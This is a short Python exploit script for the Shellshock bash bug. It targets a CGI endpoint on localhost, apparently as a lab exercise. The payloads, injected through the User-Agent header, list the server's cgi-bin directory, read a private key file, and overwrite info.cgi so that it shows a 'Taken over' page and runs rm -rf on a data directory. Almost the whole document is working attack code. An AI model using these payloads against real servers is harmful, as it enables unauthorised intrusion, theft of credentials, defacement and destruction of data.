import requests

APACHE_HOST = "localhost:8080"
TEST_CGI_URI = f"http://{APACHE_HOST}/cgi-bin/test.cgi"

# Harmlessly lists files in the server, use to check what can be updated
bash_commands_ls = (
    "() { :;}; "
    + 'echo "Content-Type: text/plain"; '
    + "echo; "
    + "/bin/ls -l /usr/lib/cgi-bin/ "
)
headers_ls = {"User-Agent": bash_commands_ls}
res = requests.get(TEST_CGI_URI, headers=headers_ls)
print(f"Files in /usr/lib/cgi-bin/:\n{res.text}")


# Reads some supposedly private files on the server
file_to_read = "/usr/lib/cgi-bin/super-impt-stuff/priv-key"
bash_commands_cat = (
    "() { :;}; "
    + 'echo "Content-Type: text/plain"; '
    + "echo; "
    + f"/bin/cat {file_to_read} "
)
headers_cat = {"User-Agent": bash_commands_cat}
res = requests.get(TEST_CGI_URI, headers=headers_cat)
print(f"Content of {file_to_read}:\n{res.text}")


# Updates info.cgi, replacing it's code with malicious stuff
bash_commands_rm = (
    "() { :;}; "
    + "echo; "
    + "echo \\#!/bin/bash > /usr/lib/cgi-bin/info.cgi && "
    + "echo $'echo \\'Content-Type: text/html\\'' >> /usr/lib/cgi-bin/info.cgi && "
    + "echo $'echo' >> /usr/lib/cgi-bin/info.cgi && "
    + "echo $'echo Taken over' >> /usr/lib/cgi-bin/info.cgi && "
    + "echo rm -rf /usr/lib/cgi-bin/super-impt-stuff >> /usr/lib/cgi-bin/info.cgi"
)
headers_rm = {"User-Agent": bash_commands_rm}
res = requests.get(TEST_CGI_URI, headers=headers_rm)
